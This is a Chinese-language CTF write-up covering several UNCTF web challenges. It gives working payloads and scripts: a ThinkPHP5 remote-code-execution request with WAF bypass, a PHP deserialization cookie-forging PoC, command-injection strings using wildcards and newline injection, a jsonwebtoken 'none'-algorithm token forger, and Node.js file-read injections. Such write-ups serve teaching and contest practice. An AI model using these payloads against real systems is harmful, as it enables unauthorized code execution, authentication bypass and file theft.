## easy_pentest（非预期解）


#### step1：

初步扫描一波大致可以确认是thinkphp5
![img01](https://imgs-1258898244.cos.ap-chengdu.myqcloud.com/ctf/unctf/img/img01.png)
访问composer文件就可以判断这就是个tp5

> 可以去git上找个项目来大致看看目录结构，比如说
> https://github.com/Astonep/tp-admin


#### step2：

翻日志，就按官方给的hint跟脚本来

```python
#coding=utf-8
import requests, time

def get5log():
    end = 17
    url = "http://183.129.189.60:10041/runtime/log/201909/"  # tp5日志的目录以及命名规则就是这样，不同版本可能略有不同
    file = url[-6: -1]
    for i in range(0, end):
        time.sleep(1)
        u = url + f"{i}.log"
        if (i < 10):
            u = url + f"0{i}.log"
        print(u)
        res = requests.get(u)
        res.close()
        if res.status_code == 200:
            print(f"saved log {i}.txt")
            filename = f"{file}_{i}.txt"
            with open(filename, 'w', encoding="utf-8") as f:
                f.write(res.text)
        else:
            print(f"{i}.log doesnt exists")

if __name__ == '__main__':
    get5log()
```

历遍完毕，可以发现一个日志文件
从里面可以看出来get了某个新的参数过去
待会读源码也能看到这个参数

![img02](https://imgs-1258898244.cos.ap-chengdu.myqcloud.com/ctf/unctf/img/img02.png)
于是直接请求
` /public/index.php?safe_key=easy_pentesnt_is_s0fun `

然后跳转到另一个页面

![img03](https://imgs-1258898244.cos.ap-chengdu.myqcloud.com/ctf/unctf/img/img03.png)

说明想使用别的任何参数得先把这个参数给加上去才行

#### step3：

既然已经得知是tp5，那么可以尝试一下method的远程代码执行漏洞

参考：[ThinkPHP5漏洞分析之代码执行10](https://mochazz.github.io/2019/04/09/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C10/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90)

拿博客里面的payload测试一下，发现system被ban掉了，所以还是存在有waf的

```
POST /public/index.php?safe_key=easy_pentesnt_is_s0fun&s=captcha HTTP/1.1
_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls
```

![img04](https://imgs-1258898244.cos.ap-chengdu.myqcloud.com/ctf/unctf/img/img04.png)

于是考虑换个姿势

同时又因为这是php7.1的，所以assert没法直接用，同时eval也不再是一个函数了，所以也没法被call_user_func直接调用

如果仅仅是读文件和目录的话，可以使用这两个函数

函数名 | 作用
- | -
scandir(directory,sorting_order,context) | 列出目录中的文件和目录
show_source(filename,return) | 返回指定目录中的文件和目录的数

另外这个题里面highlight_file()也可以代替show_source()

于是乎修改姿势如下：
参考：[https://xz.aliyun.com/t/6661#toc-10](https://xz.aliyun.com/t/6661#toc-10)
```
POST /public/index.php?safe_key=easy_pentesnt_is_s0fun&s=captcha HTTP/1.1
_method=__construct&method=get&server[]=1&filter[]=scandir&get[]=./&filter[]=var_dump
```
可以看到当前目录的所有文件都读到了

![img05](https://imgs-1258898244.cos.ap-chengdu.myqcloud.com/ctf/unctf/img/img05.png)

最终确认flag在 **/home** 路径下以后
更换姿势为 **show_source** 即可读到flag

![img06](https://imgs-1258898244.cos.ap-chengdu.myqcloud.com/ctf/unctf/img/img06.png)


#### step4：

以防万一先读一下index.php，还有别的文件

![img07]()

读出来以后拿去html转义一下

**index.php:**

```php
// +----------------------------------------------------------------------
// | ThinkPHP [ WE CAN DO IT JUST THINK ]
// +----------------------------------------------------------------------
// | Copyright (c) 2006-2016 http://thinkphp.cn All rights reserved.
// +----------------------------------------------------------------------
// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
// +----------------------------------------------------------------------
// | Author: liu21st // +----------------------------------------------------------------------

require 'waf.php';

// [ 应用入口文件 ]

// 定义应用目录
define('APP_PATH', __DIR__ . '/../application/');
// 加载框架引导文件
require __DIR__ . '/../thinkphp/start.php';

```
**waf.php:**

```php
<?php
    
/**
    
 * 检测php标记和php函数
    
 *  
    
 */
    
    
    
    
$into_safe = FALSE;
    
$safe_key_name = "safe_key";
    
$safe_key = "easy_pentesnt_is_s0fun";
    
    
    
function check_attack_keyword($str){
    
    $parrten_str = "/[ <?]\bphp\b|^ <[?]=.*$|^ <[?].*$|\bphpinfo\b|\bbase64_decode\b|\bfile_get_contents\b|\breadfile\b|\bfile\b|\bfopen\b|\bconvert_uuencode\b|^.*php:\/\/.*$/i";
    
    if (preg_match($parrten_str,$str)){
    
        die("this way is too easy!");
    
    }
    
    
 }
    
    
    
//check safekey 
    
function check_safe_key($str_k,$str_v){
    
    global $safe_key_name,$safe_key;
    
    if ($str_k == $safe_key_name && $str_v == $safe_key){
    
        return TRUE;
    
    }
    
}
    
    
//safe redirect
    
function is_safe($safe_state){
    
    if($safe_state){
    
        echo " ";
    
        echo "window.location.href='/public/static/is_safe_page.html';";
    
        echo " ";
    
    
    }else{
    
        echo " ";
    
        echo "window.location.href='/public/static/not_safe.html';";
    
        echo " ";
    
        die();
    
    }
    
}
    
    
    
    
    
function main(){
    
    global $into_safe;
    
    foreach($_GET as $key => $value){
    
        
    
        if(is_array($value)){
    
            foreach($value as $k => $v){
    
                if(check_safe_key($k,$v)){
    
                    $into_safe = TRUE;
    
                }
    
                check_attack_keyword($v);
    
            }
    
        }
    
        else{
    
            if(check_safe_key($key,$value)){
    
                $into_safe = TRUE;
    
            }
    
            check_attack_keyword($value);
    
        }
    
    }
    
    
    
    is_safe($into_safe);
    
    
    
    
    
    foreach($_POST as $key => $value){
    
        if(is_array($value)){
    
            foreach($value as $k => $v){
    
                check_attack_keyword($v);
    
            }
    
        }
    
        else{
    
            check_attack_keyword($value);
    
        }
    
    }
    
    
    
}
    
    
    
main();
    
    
    
?>
```

waf的前几行就大致告诉了要过滤什么东西，另外system函数用不了估计是直接在配置文件里给ban掉了


用的格式化脚本地址（记录一下）：
[https://gist.github.com/dervn/859717/15b69ef75a04489f3a517b3d4f70c7e97b39d2ec](https://gist.github.com/dervn/859717/15b69ef75a04489f3a517b3d4f70c7e97b39d2ec)



## k&k战队的老家

做的时候没发现有access.php.bak，orz

先用变种万能密码登陆进去

![img08](https://imgs-1258898244.cos.ap-chengdu.myqcloud.com/ctf/unctf/img/img08.png)

然后获得一串奇怪的cookie，待会就得利用这个进入debug的页面

![img09](https://imgs-1258898244.cos.ap-chengdu.myqcloud.com/ctf/unctf/img/img09.png)

然后利用伪协议直接读源码（注意大写绕过）
不过却没办法读到 **access** 跟 **flag**

![img10](https://imgs-1258898244.cos.ap-chengdu.myqcloud.com/ctf/unctf/img/img10.png)

直接访问 **access.php.bak** ，可以看到源码，这下东西就齐全了

直接定位到关键文件

**func.php:**

```php
<?php
error_reporting(0);
function waf($str) {
	if(preg_match('/(and|or|if|select|union|sleep|order|group|by|exp|user|from|where|tables|substr|database|join|greatest|like|not|hex|bin|ascii|md5|benchmark|concat|mid|strcmp|left|right|replace|when|\/|=|>|<|\*|\(|\)|~|%|!|&&|,|"|;|#|\^|-)/i', $str) == 1) {
		die('<script>alert("Illegal");window.location.href="./index.php";</script>');
	}
}

function mothed_waf($str) {
	if(preg_match('/(base64|php|write)/', $str) == 1) {
		die('<script>alert("Illegal");window.location.href="./home.php?m=index";</script>');
	}
	if(preg_match('/(flag|access)/i', $str) == 1) {
		die('<script>alert("Illegal");window.location.href="./home.php?m=index";</script>');
	}
}

function cookie_decode($str) {
	$data = urldecode($str);
	$data = substr($data, 1);
	$arr = explode('&', $data);
	$cipher = '';
	foreach($arr as $value) {
		$num = hexdec($value);
		$num = $num - 240;
		$cipher = $cipher.'%'.dechex($num);
	}
	$key = urldecode($cipher);
	$key = base64_decode($key);
	return $key;
}

function cookie_encode($str) {
	$key = base64_encode($str);
	$key = bin2hex($key);
	$arr = str_split($key, 2);
	$cipher = '';
	foreach($arr as $value) {
		$num = hexdec($value);
		$num = $num + 240;
		$cipher = $cipher.'&'.dechex($num);
	}
	return $cipher;
}

function check($str, $db, &$session) {
	if($str == "") {
		die('<script>alert("Please login again");window.location.href="./index.php";</script>');
	}
	$objstr = cookie_decode($str);
	try {
		$session = unserialize($objstr);
		$session->id = intval($session->id);
		waf($session->username);
		
	} catch(Exception $e) {
		die('<script>alert("Identity problems, please relogin");window.location.href="./index.php";</script>');
	}
	$db->index_check($session->id, $session->username);
}

function check1($obj) {
	if($obj->username !== "debuger") {
		setcookie("identy", "");
		die('<script>alert("Identity problems, please relogin");window.location.href="./index.php";</script>');
	}
}
```

**access.php:**

```php
<?php
error_reporting(0);
$hack_token = '3ecReK&key';
try {
	$d = unserialize($this->funny);
} catch(Exception $e) {
	echo '';
}
```

func里面已经给出了cookie的规则，想办法构造一下就行了，顺便还得把access里面的token带上，贴一下别人的poc：

```php
<?php

function cookie_encode($str) {
    $key = base64_encode($str);
    $key = bin2hex($key);
    $arr = str_split($key, 2);
    $cipher = '';
    foreach($arr as $value) {
        $num = hexdec($value);
        $num = $num + 240;
        $cipher = $cipher.'&'.dechex($num);
    }
    return $cipher;
}

class session{
    public $choose = 1;
    public $id = 0;
    public $username = "";
}

class debug
{
    public $choose = "2";
    public $forbidden = "";
    public $access_token = "";
    public $ob = NULL;
    public $id = 2;
    public $username = "debuger";
    public $funny = 'O:5:"debug":4:{s:6:"choose";s:1:"2";s:9:"forbidden";s:0:"";s:12:"access_token";s:10:"3ecReK&key";s:2:"ob";N;}';

    public function __construct()
    {
        $this->forbidden = unserialize('O:5:"debug":4:{s:6:"choose";s:1:"2";s:9:"forbidden";s:0:"";s:12:"access_token";s:0:"";s:2:"ob";N;}');
    }
}

$d = new debug();
//echo serialize($d);
echo urlencode(cookie_encode(serialize($d)));

?>

```

![img11](https://imgs-1258898244.cos.ap-chengdu.myqcloud.com/ctf/unctf/img/img11.png)

真长，嗯

## bypass

代码：

```php
<?php
    highlight_file(__FILE__);
    $a = $_GET['a'];
    $b = $_GET['b'];
 // try bypass it
    if (preg_match("/\'|\"|,|;|\\|\`|\*|\n|\t|\xA0|\r|\{|\}|\(|\)|<|\&[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is", $a))
        $a = "";
        $a ='"' . $a . '"';
    if (preg_match("/\'|\"|;|,|\`|\*|\\|\n|\t|\r|\xA0|\{|\}|\(|\)|<|\&[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is", $b))
        $b = "";
        $b = '"' . $b . '"';
     $cmd = "file $a $b";
      str_replace(" ","","$cmd"); 
     system($cmd);
?>
```

正则过滤有点恐怖，不过居然有大佬找到了反引号逃逸的解法…………

##### 非预期解：

首先按照反引号逃逸的思路来，虽然waf ban了ls，但是dir依旧是可以正常使用的

![img12](https://imgs-1258898244.cos.ap-chengdu.myqcloud.com/ctf/unctf/img/img12.png)

不过由于必须得用到 **grep** 或者 **find** 命令，所以用这个思路还必须去 **/bin** 目录下找文件直接执行才行

**/bin** 目录被ban的同时可以用通配符 **?** 进行访问（我学了，一秒忘了，有什么好说的）

![img13](https://imgs-1258898244.cos.ap-chengdu.myqcloud.com/ctf/unctf/img/img13.png)

于是直接使用目录下的grep找到flag


![img14](https://imgs-1258898244.cos.ap-chengdu.myqcloud.com/ctf/unctf/img/img14.png)



**payload：**
> ?a=`/b??/gre? -R ctf`


##### 然后再看看作者的预期解：

突破点在于反斜杠匹配的误写
> \\\\|\n

这样写会被解释为匹配竖线与换行符的组合

所以说参数 *b* 被过滤掉的其实是 **|\n**

另外参数 *a* 被过滤掉的则是 **|***

同样别的地方也会存在这个问题，比如markdown

![img15](https://imgs-1258898244.cos.ap-chengdu.myqcloud.com/ctf/unctf/img/img15.png)

然后可以利用%0a进行命令注入

结合一下非预期解的思路，可以得到payload

> ?a=\\\&b=%0a/b??/gr[d-f]p%20-R%20ctf%20%23

![img16](https://imgs-1258898244.cos.ap-chengdu.myqcloud.com/ctf/unctf/img/img16.png)

也可以像[安全客](https://www.anquanke.com/post/id/190613#h3-7)上边的用cat去读flag，不过找flag路径的过程比较麻烦

## arbi

完全不会的一题，基本按照wp跟[出题思路](https://xz.aliyun.com/t/6685)来的

#### step1：

不熟悉express的我去git上随便找了个项目摸索一下项目结构

地址：[https://github.com/parse-community/parse-server](https://github.com/parse-community/parse-server)

首先注册登录进去，可以看到很明显的ssrf

![img17](https://imgs-1258898244.cos.ap-chengdu.myqcloud.com/ctf/unctf/img/img17.png)



然后注册用户名为 `../package.json?` （没有任何过滤，所以可以直接注册）
**?** 刚好在解析jpg之前造成截断，然后把解析出的文件下载下来

```json
{
  "name": "arbi",
  "version": "1.0.0",
  "description": "flag in /flag",
  "main": "mainapp.js",
  "directories": {
    "test": "test"
  },
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "author": "evoA",
  "license": "ISC",
  "dependencies": {
    "axios": "^0.19.0",
    "cookie-parser": "^1.4.4",
    "express": "^4.17.1",
    "express-session": "^1.16.2",
    "jade": "^1.11.0",
    "jsonwebtoken": "^8.5.1",
    "session-file-store": "^1.3.1"
  }
}
```

#### step2:
得到flag在 `/flag` 中
项目入口在 `mainapp.js` 中

 ```js
const express = require("express");
const routers = require("./routers/index");
const app = express();
var cookieParser = require('cookie-parser'); 
const session = require('express-session');
var FileStore = require('session-file-store')(session);
const crypto = require("crypto");

app.engine('jade' ,require('jade').__express);
app.set("view engine","jade");
app.set('views', __dirname+'/views');


app.use(express.urlencoded({ extended: false }));
app.use('/upload', express.static('upload'))

app.use(cookieParser()); 
```

看到 `/routers/index` 的路由

于是注册 `../routers/index.js?` 的账号访问

 ```js
const express = require('express');

const indexController = require("../controllers/index");
const loginController = require("../controllers/login");
const regController = require("../controllers/reg");
const homeControler = require("../controllers/home");
const uriControler = require("../controllers/uri");
const adminController = require("../controllers/admin23333_interface")
const routers = express.Router();

// wwwbackup
routers.get('/VerYs3cretWwWb4ck4p33441122.zip',(req,res)=>{
    return res.sendFile(__dirname+"/www.zip")
});

routers.get('/',indexController);

routers.get('/login',(req,res)=>{res.render("login")});
routers.post('/login',loginController);

routers.get('/reg',(req,res)=>{res.render("reg")});
routers.post('/reg',regController);

routers.get('/home',homeControler);
routers.get('/uri',uriControler);

routers.get('/admin23333_interface',adminController);
routers.use(function (err, req, res, next) {
    
    return res.status(500).json({error: "sorry, something wrong"});
});
module.exports = routers

```

备份源码到手
wp里说拿到的源码跟环境里面的一毛一样，那就可以直接部署本地环境了



#### step3:

关键代码在login.js里面


 ```js
    var secret = global.secretlist[id];

    try {
        var user = jwt.verify(req.cookies.token,secret,{algorithm: "HS256"});
    } catch (error) {
        return res.status(500).json({"error":"jwt error"}).end();
    }
```

按照官方wp里给的说法

node的jsonwebtoken 有个bug，当 *jwt secret* 为空时 jsonwebtoken会采用algorithm *none* 进行解密

此时服务端就通过

 ```js
var secret = global.secretlist[id];
jwt.verify(req.cookies.token,secret);
```
解密，此时可以通过传入不存在的id，让secret为undefined，导致algorithm为none，然后就可以通过伪造jwt来成为admin
伪造脚本：
```python
# pip3 install pyjwt
import jwt
token = jwt.encode({"id":-1,"username":"admin","password":"123456"},algorithm="none",key="").decode(encoding='utf-8')
print(token)
```

**正常的session：**
```json
encode:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTE2LCJ1c2VybmFtZSI6ImFkbWluMTIzIiwicGFzc3dvcmQiOiIxMjMiLCJpYXQiOjE1NzM3MTUwNjJ9.Gxc67_Lt3wHPzuYi4m0ZobAcIplQzMsjt7H3yHKEX4g

decode:
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "id": 116,
  "username": "admin123",
  "password": "123",
  "iat": 1573715062
}

```


**伪造的session：**

```json
encode:
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpZCI6LTEsInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMzQ1NiJ9.

decode:
{
  "typ": "JWT",
  "alg": "none"
}
{
  "id": -1,
  "username": "admin",
  "password": "123456"
}
```

然后直接在login页面替换token，然后使用 **admin:123456** 直接登录
就能成为admin了

![img18](https://imgs-1258898244.cos.ap-chengdu.myqcloud.com/ctf/unctf/img/img18.png)


#### step4:

成为admin以后，就可以访问admin23333_interface这个接口了

看一波关键代码：

```js
if(req.session.username !== "admin"){
        return res.send("U Are N0t Admin")
    }
    if(req.query.name === undefined){
        return res.sendStatus(500)
    }
    else if(typeof(req.query.name) === "string"){
      
        if(req.query.name.startsWith('{') && req.query.name.endsWith('}')){
            req.query.name = JSON.parse(req.query.name)
    
            if(!/^key$/im.test(req.query.name.filename))return res.sendStatus(500);
            
    
           
        }
    }
    if(req.query.name.filename.length > 3){
        for(let c of req.query.name.filename){
            if(c !== "/" && c!=="."){
                filename += c
            }
        }
    }
    
    console.log(filename)
    
    var content = fs.readFileSync("/etc/"+filename)
    res.send(content)
```

总之这是一个读文件的操作

利用express的特性，当传入 **?a[b]=1** 的时候,变量 **a** 会自动变成一个对象 **a = {"b":1}**

所以我们只要传入 **?name[filename]=** 的话就不会执行上面几行if语句了

可以直接跳入最后一个if语句

但是此时传入的 **filename** 不能大于3，否则就无法构造 **../** 来读上一级的flag

于是可以利用express的这个特性

> express 中当碰到两个同名变量时，会把这个变量设置为数组

把 **name[filename]** 构造成数组形式的，最终得到payload：

`?name[filename]=../&name[filename]=f&name[filename]=l&name[filename]=a&name[filename]=g`

![img19](https://imgs-1258898244.cos.ap-chengdu.myqcloud.com/ctf/unctf/img/img19.png)


## CheckIn
虚假的签到题

首先贴一下最简单直接的payload：
`/calc require('fs').readFileSync('/flag',encoding='utf8')`

原理就是新建一个fs类，然后直接调用里面读文件的方法，就可以读到flag

因为用于交互的 **/calc** 没有对输入做什么严格的过滤（但是空格是被过滤掉的）

随便拿个全局变量去试，发现有回显

![img20](https://imgs-1258898244.cos.ap-chengdu.myqcloud.com/ctf/unctf/img/img20.png)

既然只求读文件的话，那么用js的fs类里面的方法就可以完成了

于是翻开[官方文档](http://nodejs.cn/api/fs.html)挨个尝试能够读目录跟文件的方法，最后试出来发现 **readFileSync()** 跟 **readdirSync()** 可以顺利读到文件跟目录

![img21](https://imgs-1258898244.cos.ap-chengdu.myqcloud.com/ctf/unctf/img/img21.png)

另外使用这两个函数的话返回参数最好设置成 **encoding='utf8'** 否则血小板那边的回显则默认是一个对象而不是字符串

